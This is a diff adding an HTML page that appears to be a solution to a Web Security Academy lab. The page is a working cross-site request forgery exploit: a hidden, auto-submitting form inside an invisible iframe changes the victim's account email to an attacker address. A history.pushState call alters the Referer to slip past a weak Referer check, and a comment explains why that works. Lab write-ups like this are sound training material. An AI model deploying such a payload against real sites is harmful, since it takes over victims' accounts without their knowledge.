@@ -1,0 +1,22 @@
+<html>
+
+    <body>
+        <h1>Hello Victim!</h1>
+
+    <!--we are using iframe to hide the email box on the page -->
+
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        
+        <form action="https://ace11f801ea038f6c0d7656300e8004b.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
+            <input type="hidden" name="email" value="h4cker@h4ckers.com">
+        </form>
+
+        <script>
+
+        document.getElementById("csrf-form").submit()
+        history.pushState("", "", "/?ace11f801ea038f6c0d7656300e8004b.web-security-academy.net")
+        // although the before ? is not good it will be accepted because it only checks for id.web-security-academy.net if exists
+	</script>
+    
+    </body>
+</html>
